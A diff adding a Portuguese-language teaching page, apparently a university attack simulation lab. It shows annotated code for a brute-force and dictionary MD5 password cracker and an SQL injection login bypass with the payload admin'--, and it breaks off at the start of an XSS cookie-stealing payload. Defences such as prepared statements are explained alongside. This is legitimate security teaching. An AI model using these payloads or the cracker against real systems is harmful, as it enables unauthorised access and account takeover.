@@ -1,0 +1,612 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Laboratório de Simulação de Ataques</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&family=Syne:wght@400;600;700;800&display=swap" rel="stylesheet">
+<style>
+:root{--bg:#04080f;--surface:#080f1c;--card:#0b1425;--border:#112240;--border2:#1a3358;--text:#a8c4e0;--text2:#4a7090;--text3:#1e3a5a;--green:#00e5a0;--red:#ff3355;--blue:#00aaff;--amber:#ffaa00;--purple:#aa55ff;--cyan:#00e5ff;--mono:'JetBrains Mono',monospace;--sans:'Syne',sans-serif;}
+*{margin:0;padding:0;box-sizing:border-box;}
+html,body{height:100%;overflow:hidden;}
+body{background:var(--bg);color:var(--text);font-family:var(--mono);position:relative;}
+body::after{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,0.06) 2px,rgba(0,0,0,0.06) 4px);pointer-events:none;z-index:9999;}
+#mx{position:fixed;inset:0;opacity:0.03;z-index:0;pointer-events:none;}
+#screen-menu{position:fixed;inset:0;z-index:10;display:flex;flex-direction:column;overflow-y:auto;}
+.menu-header{padding:40px 48px 28px;display:flex;justify-content:space-between;align-items:flex-end;flex-wrap:wrap;gap:16px;border-bottom:1px solid var(--border);background:rgba(4,8,15,0.85);backdrop-filter:blur(8px);position:sticky;top:0;z-index:20;}
+.menu-tag{font-size:0.6rem;letter-spacing:5px;color:var(--green);margin-bottom:10px;display:block;}
+.menu-title{font-family:var(--sans);font-size:clamp(1.6rem,3.5vw,2.6rem);font-weight:800;color:#fff;line-height:1.1;}
+.menu-title span{background:linear-gradient(90deg,var(--green),var(--cyan));-webkit-background-clip:text;-webkit-text-fill-color:transparent;}
+.menu-prof{text-align:right;}
+.menu-prof-label{font-size:0.58rem;letter-spacing:3px;color:var(--text3);display:block;margin-bottom:4px;}
+.menu-prof-name{font-family:var(--sans);font-size:1rem;font-weight:700;color:var(--text2);}
+.menu-prof-sub{font-size:0.63rem;color:var(--text3);margin-top:2px;letter-spacing:1px;}
+.menu-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(260px,1fr));gap:14px;padding:28px 48px 48px;max-width:1400px;margin:0 auto;width:100%;}
+.algo-card{background:var(--card);border:1px solid var(--border);border-radius:8px;padding:22px;cursor:pointer;transition:all 0.2s;position:relative;overflow:hidden;}
+.algo-card::before{content:'';position:absolute;top:0;left:0;right:0;height:3px;transition:opacity 0.2s;}
+.algo-card:hover{border-color:var(--border2);transform:translateY(-2px);}
+.c-red::before{background:var(--red);}
+.c-amber::before{background:var(--amber);}
+.c-purple::before{background:var(--purple);}
+.c-blue::before{background:var(--blue);}
+.card-num{font-size:0.58rem;letter-spacing:3px;color:var(--text3);margin-bottom:10px;}
+.card-icon{font-size:2rem;margin-bottom:10px;display:block;}
+.card-title{font-family:var(--sans);font-size:1.1rem;font-weight:700;color:#fff;margin-bottom:5px;}
+.card-tag{display:inline-block;padding:2px 8px;border-radius:2px;font-size:0.57rem;letter-spacing:2px;margin-bottom:10px;}
+.tag-red{background:rgba(255,51,85,0.12);color:var(--red);border:1px solid rgba(255,51,85,0.25);}
+.tag-amber{background:rgba(255,170,0,0.1);color:var(--amber);border:1px solid rgba(255,170,0,0.2);}
+.tag-purple{background:rgba(170,85,255,0.1);color:var(--purple);border:1px solid rgba(170,85,255,0.2);}
+.tag-blue{background:rgba(0,170,255,0.1);color:var(--blue);border:1px solid rgba(0,170,255,0.2);}
+.card-desc{font-size:0.7rem;color:var(--text2);line-height:1.7;margin-bottom:14px;}
+.card-steps{font-size:0.6rem;color:var(--text3);letter-spacing:1px;display:flex;align-items:center;gap:6px;}
+.card-arrow{margin-left:auto;color:var(--text3);transition:all 0.2s;}
+.algo-card:hover .card-arrow{color:var(--green);transform:translateX(4px);}
+#screen-algo{position:fixed;inset:0;z-index:10;display:none;flex-direction:column;}
+.algo-topbar{height:50px;background:rgba(4,8,15,0.97);border-bottom:1px solid var(--border);display:flex;align-items:center;gap:14px;padding:0 20px;flex-shrink:0;}
+.btn-back{padding:5px 13px;border:1px solid var(--border2);color:var(--text2);font-family:var(--mono);font-size:0.68rem;letter-spacing:2px;cursor:pointer;border-radius:3px;background:transparent;transition:all 0.2s;}
+.btn-back:hover{border-color:var(--green);color:var(--green);}
+.tb-title{font-family:var(--sans);font-size:0.9rem;font-weight:700;color:#fff;}
+.tb-tag{font-size:0.58rem;letter-spacing:2px;padding:2px 8px;border-radius:2px;}
+.tb-steps{margin-left:auto;font-size:0.62rem;color:var(--text3);letter-spacing:2px;}
+.algo-body{flex:1;display:grid;grid-template-columns:1fr 1fr;overflow:hidden;}
+.pane-code{border-right:1px solid var(--border);display:flex;flex-direction:column;overflow:hidden;}
+.pane-hdr{padding:9px 16px;border-bottom:1px solid var(--border);background:rgba(0,0,0,0.3);display:flex;align-items:center;gap:7px;flex-shrink:0;}
+.dot{width:8px;height:8px;border-radius:50%;}
+.pfname{font-size:0.66rem;letter-spacing:1px;color:var(--text2);margin-left:4px;}
+.code-scroll{flex:1;overflow-y:auto;padding:6px 0;}
+.code-line{display:flex;padding:1px 14px;transition:background 0.25s,border-left 0.25s;border-left:2px solid transparent;font-size:0.71rem;line-height:1.85;}
+.hl-green{background:rgba(0,229,160,0.07);border-left-color:var(--green)!important;}
+.hl-red{background:rgba(255,51,85,0.07);border-left-color:var(--red)!important;}
+.hl-amber{background:rgba(255,170,0,0.07);border-left-color:var(--amber)!important;}
+.hl-blue{background:rgba(0,170,255,0.07);border-left-color:var(--blue)!important;}
+.ln{color:var(--text3);min-width:24px;user-select:none;padding-right:12px;font-size:0.63rem;}
+.kw{color:#ff79c6;}.fn{color:#50fa7b;}.str{color:#f1fa8c;}.cm{color:#4a6272;font-style:italic;}.var{color:#8be9fd;}.num{color:#bd93f9;}
+.step-bar{padding:9px 14px;border-top:1px solid var(--border);background:rgba(0,0,0,0.3);display:flex;align-items:center;gap:7px;flex-shrink:0;}
+.sbtn{padding:6px 16px;font-size:0.66rem;letter-spacing:2px;font-family:var(--mono);cursor:pointer;border-radius:3px;border:1px solid;transition:all 0.15s;}
+.sbtn:disabled{opacity:0.3;cursor:not-allowed;}
+.sbtn-prev{border-color:var(--border2);color:var(--text2);background:transparent;}
+.sbtn-prev:hover:not(:disabled){border-color:var(--text2);color:var(--text);}
+.sbtn-next{border-color:var(--green);color:var(--green);background:transparent;}
+.sbtn-next:hover:not(:disabled){background:rgba(0,229,160,0.1);}
+.sbtn-rst{border-color:var(--border);color:var(--text3);background:transparent;font-size:0.6rem;}
+.sbtn-rst:hover{border-color:var(--red);color:var(--red);}
+.step-num{margin-left:auto;font-size:0.6rem;color:var(--text3);letter-spacing:2px;}
+.pane-visual{display:flex;flex-direction:column;overflow:hidden;}
+.vis-scroll{flex:1;overflow-y:auto;padding:18px;}
+.exp-box{padding:11px 14px;border-left:2px solid var(--green);background:rgba(0,229,160,0.04);border-radius:0 4px 4px 0;font-size:0.73rem;line-height:1.75;color:var(--text);margin-bottom:12px;transition:all 0.3s;}
+.exp-box.danger{border-left-color:var(--red);background:rgba(255,51,85,0.04);}
+.exp-box.warn{border-left-color:var(--amber);background:rgba(255,170,0,0.04);}
+.exp-box.info{border-left-color:var(--blue);background:rgba(0,170,255,0.04);}
+.exp-lbl{font-size:0.58rem;letter-spacing:3px;color:var(--text3);margin-bottom:5px;display:block;}
+.vis-lbl{font-size:0.58rem;letter-spacing:3px;color:var(--text3);margin-bottom:7px;display:block;}
+.pass-wrap{background:#020509;border-radius:4px;padding:13px;margin-bottom:11px;}
+.pass-disp{font-size:1.5rem;letter-spacing:10px;text-align:center;margin-bottom:7px;}
+.pc{display:inline-block;transition:color 0.1s;}
+.pc-lock{color:var(--text3);}.pc-try{color:var(--amber);animation:fl 0.1s infinite;}.pc-ok{color:var(--green);}
+@keyframes fl{0%,100%{opacity:1}50%{opacity:0.2}}
+.att-lbl{font-size:0.66rem;color:var(--text2);text-align:center;margin-bottom:5px;}
+.prog-t{height:3px;background:var(--border);border-radius:2px;}
+.prog-f{height:100%;border-radius:2px;transition:width 0.3s;}
+.sql-wrap{background:#020509;border-radius:4px;padding:11px;font-size:0.71rem;line-height:1.9;margin-bottom:11px;}
+.sq-s{color:#50fa7b;}.sq-i{color:var(--red);text-decoration:underline;text-decoration-color:rgba(255,51,85,0.4);}.sq-n{color:var(--text2);}
+.sql-res{padding:7px 11px;border-radius:3px;font-size:0.71rem;margin-bottom:11px;border:1px solid var(--border);}
+.dom-wrap{background:#020509;border-radius:4px;padding:11px;font-size:0.71rem;line-height:2;margin-bottom:9px;}
+.dn{display:block;color:#50fa7b;transition:all 0.3s;}
+.dn-inj{color:var(--red);animation:pr 0.8s infinite;}
+.dn-i1{padding-left:14px;}.dn-i2{padding-left:28px;}
+@keyframes pr{0%,100%{opacity:1}50%{opacity:0.4}}
+.ck-box{padding:7px 11px;background:rgba(170,85,255,0.08);border:1px solid rgba(170,85,255,0.3);border-radius:3px;font-size:0.66rem;color:var(--purple);margin-bottom:9px;}
+.em-wrap{background:#020509;border:1px solid var(--border);border-radius:4px;overflow:hidden;margin-bottom:11px;}
+.em-hdr{padding:9px 13px;border-bottom:1px solid var(--border);}
+.ef{display:flex;gap:8px;font-size:0.66rem;padding:2px 0;}
+.ef-l{color:var(--text3);min-width:48px;}.ef-v{color:var(--text);}.ef-s{color:var(--red);}.ef-f{color:var(--amber);}
+.em-body{padding:13px;font-size:0.71rem;line-height:1.8;color:var(--text2);}
+.elink{color:var(--blue);}.elink-fake{color:var(--red);}
+.mem-tbl{display:grid;grid-template-columns:68px 1fr;gap:4px;font-size:0.65rem;margin-bottom:9px;}
+.mem-addr{color:var(--text2);padding:4px 0;display:flex;align-items:center;}
+.mem-cv{padding:4px 10px;border:1px solid var(--border);border-radius:2px;color:var(--text2);transition:all 0.3s;font-size:0.65rem;}
+.mc-ok{border-color:var(--green)!important;color:var(--green)!important;background:rgba(0,229,160,0.06)!important;}
+.mc-warn{border-color:var(--amber)!important;color:var(--amber)!important;background:rgba(255,170,0,0.06)!important;}
+.mc-over{border-color:var(--red)!important;color:var(--red)!important;background:rgba(255,51,85,0.08)!important;animation:pr 0.5s infinite;}
+.mc-inj{border-color:var(--purple)!important;color:var(--purple)!important;background:rgba(170,85,255,0.1)!important;}
+.mbytes{display:flex;gap:3px;flex-wrap:wrap;margin-bottom:9px;}
+.mb{width:26px;height:26px;border:1px solid var(--border);border-radius:2px;display:flex;align-items:center;justify-content:center;font-size:0.56rem;transition:all 0.3s;color:var(--text3);}
+.mb-ok{border-color:var(--green);color:var(--green);background:rgba(0,229,160,0.07);}
+.mb-over{border-color:var(--red);color:var(--red);background:rgba(255,51,85,0.1);animation:pr 0.5s infinite;}
+.mb-inj{border-color:var(--purple);color:var(--purple);background:rgba(170,85,255,0.1);}
+.bot-grid{display:grid;grid-template-columns:repeat(6,1fr);gap:5px;margin-bottom:11px;}
+.bot{aspect-ratio:1;border:1px solid var(--border);border-radius:3px;display:flex;align-items:center;justify-content:center;font-size:0.8rem;transition:all 0.3s;}
+.b-idle{color:var(--text3);}.b-inf{border-color:var(--red);background:rgba(255,51,85,0.07);animation:pr 1s infinite;}.b-fire{border-color:var(--amber);background:rgba(255,170,0,0.09);}
+.net-row{display:flex;align-items:center;justify-content:center;gap:9px;margin-bottom:13px;flex-wrap:wrap;}
+.nnode{padding:7px 13px;border:1px solid var(--border);border-radius:4px;font-size:0.68rem;text-align:center;transition:all 0.3s;min-width:75px;}
+.nn-ok{border-color:var(--green);color:var(--green);background:rgba(0,229,160,0.06);}
+.nn-atk{border-color:var(--red);color:var(--red);background:rgba(255,51,85,0.06);}
+.nn-mid{border-color:var(--purple);color:var(--purple);background:rgba(170,85,255,0.06);}
+.nn-def{border-color:var(--blue);color:var(--blue);background:rgba(0,170,255,0.06);}
+.narr{color:var(--text3);font-size:1rem;transition:color 0.3s;}
+.na-atk{color:var(--red)!important;}.na-blk{color:var(--green)!important;}
+.pkt-list{display:flex;flex-direction:column;gap:4px;margin-bottom:9px;}
+.pkt{padding:5px 9px;border:1px solid var(--border);border-radius:3px;font-size:0.65rem;display:flex;justify-content:space-between;}
+.pkt-int{border-color:var(--purple);color:var(--purple);background:rgba(170,85,255,0.05);}
+.file-grid{display:grid;grid-template-columns:repeat(5,1fr);gap:4px;margin-bottom:9px;}
+.fitem{padding:7px 3px;border:1px solid var(--border);border-radius:3px;text-align:center;font-size:0.58rem;color:var(--text2);transition:all 0.4s;}
+.fi-icon{font-size:1rem;display:block;margin-bottom:2px;}
+.fenc{border-color:var(--amber);color:var(--amber);background:rgba(255,170,0,0.06);animation:pr 0.5s infinite;}
+.flocked{border-color:var(--red);color:var(--red);background:rgba(255,51,85,0.05);}
+.rn{padding:9px 11px;background:rgba(255,51,85,0.06);border:1px solid rgba(255,51,85,0.3);border-radius:3px;font-size:0.66rem;color:var(--red);line-height:1.7;margin-bottom:9px;}
+.load-lbl{font-size:0.63rem;color:var(--text2);margin-bottom:4px;}
+::-webkit-scrollbar{width:3px;height:3px;}
+::-webkit-scrollbar-track{background:var(--bg);}
+::-webkit-scrollbar-thumb{background:var(--border2);border-radius:2px;}
+</style>
+</head>
+<body>
+<canvas id="mx"></canvas>
+
+<div id="screen-menu">
+  <div class="menu-header">
+    <div>
+      <span class="menu-tag">// SEGURANÇA DE SISTEMAS //</span>
+      <div class="menu-title">Laboratório de<br><span>Simulação de Ataques</span></div>
+    </div>
+    <div class="menu-prof">
+      <span class="menu-prof-label">PROFESSOR</span>
+      <div class="menu-prof-name">Dr. Cristiano S. Macêdo</div>
+      <div class="menu-prof-sub">Sistemas para Internet</div>
+    </div>
+  </div>
+  <div class="menu-grid">
+    <div class="algo-card c-red" onclick="openAlgo('brute')"><div class="card-num">01 / 08</div><span class="card-icon">💀</span><div class="card-title">Brute Force</div><span class="card-tag tag-red">QUEBRA DE SENHA</span><div class="card-desc">Testa combinações sistemáticas até encontrar a senha correta. Cracker animado em tempo real com contador de tentativas.</div><div class="card-steps">⬡ 5 passos interativos <span class="card-arrow">→</span></div></div>
+    <div class="algo-card c-amber" onclick="openAlgo('sqli')"><div class="card-num">02 / 08</div><span class="card-icon">🗄️</span><div class="card-title">SQL Injection</div><span class="card-tag tag-amber">INJEÇÃO DE CÓDIGO</span><div class="card-desc">Manipulação de queries SQL via campos não validados. Construtor de query ao vivo mostra o ataque acontecendo.</div><div class="card-steps">⬡ 5 passos interativos <span class="card-arrow">→</span></div></div>
+    <div class="algo-card c-purple" onclick="openAlgo('xss')"><div class="card-num">03 / 08</div><span class="card-icon">💉</span><div class="card-title">Cross-Site Scripting</div><span class="card-tag tag-purple">INJEÇÃO DE SCRIPT</span><div class="card-desc">JavaScript malicioso injetado em páginas web. Veja o DOM sendo infectado e o cookie da vítima sendo capturado.</div><div class="card-steps">⬡ 5 passos interativos <span class="card-arrow">→</span></div></div>
+    <div class="algo-card c-blue" onclick="openAlgo('phish')"><div class="card-num">04 / 08</div><span class="card-icon">🎣</span><div class="card-title">Phishing</div><span class="card-tag tag-blue">ENGENHARIA SOCIAL</span><div class="card-desc">Construção passo a passo de e-mail de phishing convincente — remetente falso, urgência e URL disfarçada.</div><div class="card-steps">⬡ 5 passos interativos <span class="card-arrow">→</span></div></div>
+    <div class="algo-card c-red" onclick="openAlgo('buffer')"><div class="card-num">05 / 08</div><span class="card-icon">💾</span><div class="card-title">Buffer Overflow</div><span class="card-tag tag-red">EXPLORAÇÃO DE MEMÓRIA</span><div class="card-desc">Invasão de áreas críticas da stack por estouro de buffer. Mapa de memória mostra bytes invadindo o endereço de retorno.</div><div class="card-steps">⬡ 6 passos interativos <span class="card-arrow">→</span></div></div>
+    <div class="algo-card c-red" onclick="openAlgo('ddos')"><div class="card-num">06 / 08</div><span class="card-icon">💥</span><div class="card-title">DDoS / Botnet</div><span class="card-tag tag-red">NEGAÇÃO DE SERVIÇO</span><div class="card-desc">Recrutamento de zumbis e ataque distribuído coordenado. Veja a botnet se formando e derrubando o servidor.</div><div class="card-steps">⬡ 6 passos interativos <span class="card-arrow">→</span></div></div>
+    <div class="algo-card c-purple" onclick="openAlgo('mitm')"><div class="card-num">07 / 08</div><span class="card-icon">👤</span><div class="card-title">Man in the Middle</div><span class="card-tag tag-purple">INTERCEPTAÇÃO</span><div class="card-desc">ARP Poisoning para interceptar comunicações. Pacotes capturados e modificados em trânsito sem as partes perceberem.</div><div class="card-steps">⬡ 5 passos interativos <span class="card-arrow">→</span></div></div>
+    <div class="algo-card c-amber" onclick="openAlgo('ransom')"><div class="card-num">08 / 08</div><span class="card-icon">🔒</span><div class="card-title">Ransomware</div><span class="card-tag tag-amber">SEQUESTRO DE DADOS</span><div class="card-desc">Ciclo completo: infiltração, propagação, exfiltração, criptografia e extorsão. Arquivos bloqueados em tempo real.</div><div class="card-steps">⬡ 7 passos interativos <span class="card-arrow">→</span></div></div>
+  </div>
+</div>
+
+<div id="screen-algo">
+  <div class="algo-topbar">
+    <button class="btn-back" onclick="closeAlgo()">← MENU</button>
+    <div class="tb-title" id="tb-title">—</div>
+    <span class="tb-tag" id="tb-tag"></span>
+    <div class="tb-steps" id="tb-steps">PASSO 0/0</div>
+  </div>
+  <div class="algo-body">
+    <div class="pane-code">
+      <div class="pane-hdr">
+        <div class="dot" style="background:#ff5f56"></div>
+        <div class="dot" style="background:#ffbd2e"></div>
+        <div class="dot" style="background:#27c93f"></div>
+        <span class="pfname" id="pfname">arquivo.py</span>
+      </div>
+      <div class="code-scroll" id="code-area"></div>
+      <div class="step-bar">
+        <button class="sbtn sbtn-prev" id="btn-prev" onclick="goStep(-1)">◀ PREV</button>
+        <button class="sbtn sbtn-next" id="btn-next" onclick="goStep(1)">NEXT ▶</button>
+        <button class="sbtn sbtn-rst" onclick="doReset()">↺ RESET</button>
+        <span class="step-num" id="step-num">0/0</span>
+      </div>
+    </div>
+    <div class="pane-visual">
+      <div class="pane-hdr">
+        <div class="dot" style="background:var(--green);opacity:0.6"></div>
+        <span class="pfname">simulação visual</span>
+      </div>
+      <div class="vis-scroll" id="vis-area"></div>
+    </div>
+  </div>
+</div>
+
+<script>
+// MATRIX
+const cv=document.getElementById('mx'),cx=cv.getContext('2d');
+function rs(){cv.width=innerWidth;cv.height=innerHeight;}rs();
+window.addEventListener('resize',rs);
+const CH='アイウエオ0123456789ABCDEF';
+const dr=Array(Math.floor(innerWidth/16)).fill(1);
+setInterval(()=>{cx.fillStyle='rgba(4,8,15,0.05)';cx.fillRect(0,0,cv.width,cv.height);cx.fillStyle='#00e5a0';cx.font='12px monospace';dr.forEach((y,i)=>{cx.fillText(CH[Math.floor(Math.random()*CH.length)],i*16,y*16);if(y*16>cv.height&&Math.random()>.975)dr[i]=0;dr[i]++;});},60);
+
+let curAlgo=null,curStep=0,tmr=null;
+
+const ALGOS={
+brute:{title:'Brute Force',tag:'QUEBRA DE SENHA',tagCls:'tag-red',fname:'brute_force.py',
+code:[
+{t:'<span class="cm"># Ataque de força bruta / dicionário</span>'},
+{t:'<span class="kw">import</span> <span class="var">itertools</span>, <span class="var">string</span>, <span class="var">hashlib</span>'},
+{t:''},
+{t:'<span class="var">TARGET_HASH</span> = <span class="str">"5f4dcc3b5aa765d61d8327deb882cf99"</span>'},
+{t:'<span class="var">CHARSET</span>     = <span class="var">string</span>.<span class="fn">ascii_lowercase</span> + <span class="var">string</span>.<span class="fn">digits</span>'},
+{t:'<span class="var">attempts</span>    = <span class="num">0</span>'},
+{t:''},
+{t:'<span class="cm"># Fase 1 — dicionário de senhas comuns</span>'},
+{t:'<span class="kw">with</span> <span class="fn">open</span>(<span class="str">"rockyou.txt"</span>) <span class="kw">as</span> <span class="var">f</span>:'},
+{t:'&nbsp;&nbsp;<span class="kw">for</span> <span class="var">word</span> <span class="kw">in</span> <span class="var">f</span>:'},
+{t:'&nbsp;&nbsp;&nbsp;&nbsp;<span class="var">attempts</span> += <span class="num">1</span>'},
+{t:'&nbsp;&nbsp;&nbsp;&nbsp;<span class="kw">if</span> <span class="fn">md5</span>(<span class="var">word</span>) == <span class="var">TARGET_HASH</span>: <span class="kw">break</span>'},
+{t:''},
+{t:'<span class="cm"># Fase 2 — força bruta total (combinatória)</span>'},
+{t:'<span class="kw">for</span> <span class="var">length</span> <span class="kw">in</span> <span class="fn">range</span>(<span class="num">1</span>, <span class="num">9</span>):'},
+{t:'&nbsp;&nbsp;<span class="kw">for</span> <span class="var">combo</span> <span class="kw">in</span> <span class="var">itertools</span>.<span class="fn">product</span>(<span class="var">CHARSET</span>, <span class="var">repeat</span>=<span class="var">length</span>):'},
+{t:'&nbsp;&nbsp;&nbsp;&nbsp;<span class="var">candidate</span> = <span class="str">""</span>.<span class="fn">join</span>(<span class="var">combo</span>)'},
+{t:'&nbsp;&nbsp;&nbsp;&nbsp;<span class="var">attempts</span> += <span class="num">1</span>'},
+{t:'&nbsp;&nbsp;&nbsp;&nbsp;<span class="kw">if</span> <span class="fn">md5</span>(<span class="var">candidate</span>) == <span class="var">TARGET_HASH</span>:'},
+{t:'&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="fn">print</span>(<span class="str">f"CRACKED: {candidate} em {attempts} tentativas"</span>)'},
+],
+steps:[
+{lines:[],hl:'',lbl:'INTRODUÇÃO',cls:'',txt:'O algoritmo de força bruta não exige inteligência — apenas tempo e poder computacional. Ele testa <strong>todas as combinações possíveis</strong> até encontrar a que gera o mesmo hash da senha alvo.'},
+{lines:[8,9,10,11],hl:'hl-amber',lbl:'FASE 1 — DICIONÁRIO',cls:'warn',txt:'Antes da força bruta total, testa senhas de uma wordlist (ex: rockyou.txt com 14 milhões de senhas vazadas). Rápido e eficaz — <strong>80% das senhas fracas</strong> estão nessas listas.'},
+{lines:[14,15,16,17,18],hl:'hl-red',lbl:'FASE 2 — COMBINATÓRIA',cls:'danger',txt:'Para 6 caracteres alfanuméricos: 36⁶ = <strong>2.176.782.336 combinações</strong>. Com GPU moderna: ~10 bilhões de tentativas/segundo. Uma senha de 6 chars é quebrada em segundos.'},
+{lines:[19,20],hl:'hl-green',lbl:'SENHA ENCONTRADA',cls:'',txt:'O hash da candidata bate com o hash alvo. O algoritmo registra a senha e o número de tentativas. Cada caractere extra multiplica o tempo exponencialmente.'},
+{lines:[],hl:'',lbl:'DEFESA',cls:'info',txt:'<strong>Senhas longas vencem:</strong> "p4ss" → segundos. "p4ssw0rd!xY" → anos. Use <strong>2FA</strong> e bloqueio após N tentativas. Um gerenciador de senhas cria senhas de 20+ caracteres automaticamente.'},
+],
+initV(){document.getElementById('vis-area').innerHTML=`<span class="vis-lbl">// SIMULAÇÃO DO CRACKER //</span><div class="pass-wrap"><div class="att-lbl" id="ba">Tentativas: 0</div><div class="pass-disp">${[0,1,2,3,4,5].map(i=>`<span class="pc pc-lock" id="bc${i}">?</span>`).join('')}</div><div class="prog-t"><div class="prog-f" id="bp" style="width:0%;background:var(--red)"></div></div></div><div class="exp-box" id="be"><span class="exp-lbl">AGUARDANDO</span>Clique em NEXT para iniciar.</div>`;},
+updV(s){
+const ex=document.getElementById('be');
+if(ex){ex.className='exp-box'+(this.steps[s].cls?' '+this.steps[s].cls:'');ex.innerHTML=`<span class="exp-lbl">${this.steps[s].lbl}</span>${this.steps[s].txt}`;}
+if(tmr){clearInterval(tmr);tmr=null;}
+if(s===0){for(let i=0;i<6;i++){const c=document.getElementById('bc'+i);if(c){c.className='pc pc-lock';c.textContent='?';}}const p=document.getElementById('bp');if(p)p.style.width='0%';const a=document.getElementById('ba');if(a)a.textContent='Tentativas: 0';}
+if(s===2){const T='p4ssw0',CS='abcdefghijklmnopqrstuvwxyz0123456789';let att=0,pos=0;const fd=Array(6).fill(false);tmr=setInterval(()=>{if(pos>=6){clearInterval(tmr);return;}att+=Math.floor(Math.random()*900)+100;const a=document.getElementById('ba');if(a)a.textContent='Tentativas: '+att.toLocaleString('pt-BR');const c=document.getElementById('bc'+pos);if(!c)return;if(!fd[pos]){c.className='pc pc-try';c.textContent=CS[Math.floor(Math.random()*CS.length)];if(Math.random()<0.07){c.textContent=T[pos];c.className='pc pc-ok';fd[pos]=true;pos++;}}const p=document.getElementById('bp');if(p)p.style.width=(pos/6*100)+'%';},55);}
+}},
+
+sqli:{title:'SQL Injection',tag:'INJEÇÃO DE CÓDIGO',tagCls:'tag-amber',fname:'sqli_attack.py',
+code:[
+{t:'<span class="cm"># Sistema de login vulnerável</span>'},
+{t:'<span class="var">user</span>  = <span class="fn">input</span>(<span class="str">"usuário: "</span>)'},
+{t:'<span class="var">passw</span> = <span class="fn">input</span>(<span class="str">"senha: "</span>)'},
+{t:''},
+{t:'<span class="cm"># ❌ Query vulnerável — concatenação direta</span>'},
+{t:'<span class="var">query</span> = (<span class="str">f"SELECT * FROM users"</span>'},
+{t:'&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span class="str">f" WHERE login=\'{user}\'"</span>'},
+{t:'&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span class="str">f" AND pass=\'{passw}\'"</span>)'},
+{t:''},
+{t:'<span class="cm"># Atacante digita no campo usuário:</span>'},
+{t:'<span class="var">user</span>  = <span class="str">"admin\'--"</span>  <span class="cm"># payload!</span>'},
+{t:'<span class="var">passw</span> = <span class="str">"qualquer"</span>   <span class="cm"># ignorada</span>'},
+{t:''},
+{t:'<span class="cm"># Query resultante (perigosa!):</span>'},
+{t:'<span class="cm"># SELECT * FROM users</span>'},
+{t:'<span class="cm">#   WHERE login=\'admin\'--\' AND pass=\'x\'</span>'},
+{t:'<span class="cm"># "--" comenta o AND → sem checar senha!</span>'},
+{t:''},
+{t:'<span class="cm"># ✅ Correção: Prepared Statements</span>'},
+{t:'<span class="var">query</span> = <span class="str">"SELECT * FROM users WHERE login=? AND pass=?"</span>'},
+{t:'<span class="var">cursor</span>.<span class="fn">execute</span>(<span class="var">query</span>, (<span class="var">user</span>, <span class="var">passw</span>))'},
+],
+steps:[
+{lines:[],hl:'',lbl:'CENÁRIO',cls:'',txt:'Um sistema de login constrói a query SQL concatenando diretamente o input do usuário. Vulnerabilidade antiga e ainda muito comum na web.'},
+{lines:[1,2,5,6,7,8],hl:'hl-amber',lbl:'QUERY NORMAL',cls:'warn',txt:'Login legítimo: usuário digita "admin" e sua senha. A query é montada e enviada ao banco. O banco verifica ambos os campos normalmente.'},
+{lines:[10,11],hl:'hl-red',lbl:'PAYLOAD INJETADO',cls:'danger',txt:'O atacante digita <code>admin\'--</code> no campo usuário. O apóstrofo <strong>fecha a string prematuramente</strong> e os hífens <strong>comentam o restante</strong> da query — incluindo a verificação de senha.'},
+{lines:[14,15,16,17],hl:'hl-red',lbl:'QUERY QUEBRADA',cls:'danger',txt:'A query resultante verifica apenas <code>WHERE login=\'admin\'</code> — a condição de senha foi comentada! O banco retorna o usuário <strong>sem verificar a senha</strong>. Acesso total concedido.'},
+{lines:[19,20],hl:'hl-green',lbl:'DEFESA — PREPARED STATEMENTS',cls:'info',txt:'Com Prepared Statements, o banco trata o input como <strong>dado puro</strong>, jamais como SQL. O payload <code>admin\'--</code> procuraria literalmente um usuário com esse nome, que não existe.'},
+],
+initV(){document.getElementById('vis-area').innerHTML=`<span class="vis-lbl">// CONSTRUTOR DE QUERY AO VIVO //</span><div class="sql-wrap" id="sq"><span class="sq-n">SELECT * FROM users WHERE login='</span><span id="su" class="sq-s">admin</span><span class="sq-n">' AND pass='</span><span id="sp" class="sq-s">••••••</span><span class="sq-n">'</span></div><div class="vis-lbl">// RESULTADO //</div><div class="sql-res" id="sr">Aguardando execução...</div><div class="exp-box" id="se"><span class="exp-lbl">AGUARDANDO</span>Clique em NEXT para iniciar.</div>`;},
+updV(s){
+const ex=document.getElementById('se');if(ex){ex.className='exp-box'+(this.steps[s].cls?' '+this.steps[s].cls:'');ex.innerHTML=`<span class="exp-lbl">${this.steps[s].lbl}</span>${this.steps[s].txt}`;}
+const u=document.getElementById('su'),p=document.getElementById('sp'),r=document.getElementById('sr');if(!u)return;
+const st=[{u:'admin',p:'••••••',uc:'sq-s',pc:'sq-s',r:'Aguardando execução...'},{u:'admin',p:'senhaCorreta',uc:'sq-s',pc:'sq-s',r:'✅ Login autorizado — 1 registro encontrado.'},{u:"admin'--",p:'qualquer',uc:'sq-i',pc:'sq-i',r:'⚠️ Montando query maliciosa...'},{u:"admin'--",p:'qualquer',uc:'sq-i',pc:'sq-i',r:"💀 EXECUTADA: WHERE login='admin'-- AND pass='x' → Senha IGNORADA! Admin logado."},{u:'admin',p:'senhaCorreta',uc:'sq-s',pc:'sq-s',r:'✅ Prepared Statement: input tratado como dado puro. Injeção impossível.'}];
+const d=st[s]||st[0];u.textContent=d.u;u.className=d.uc;p.textContent=d.p;p.className=d.pc;r.textContent=d.r;
+r.style.borderColor=s===3?'var(--red)':s===4?'var(--green)':'var(--border)';r.style.color=s===3?'var(--red)':s===4?'var(--green)':'var(--text2)';
+}},
+
+xss:{title:'Cross-Site Scripting (XSS)',tag:'INJEÇÃO DE SCRIPT',tagCls:'tag-purple',fname:'xss_payload.js',
+code:[
+{t:'<span class="cm">// Campo de busca SEM sanitização</span>'},
+{t:'<span class="cm">// Atacante insere no campo:</span>'},
+{t:''},
+{t:'<span class="var">payload</span> = <span class="str">`&lt;script&gt;`</span>'},
+{t:'&nbsp;&nbsp;<span class="cm">// Capturar e enviar cookie</span>'},
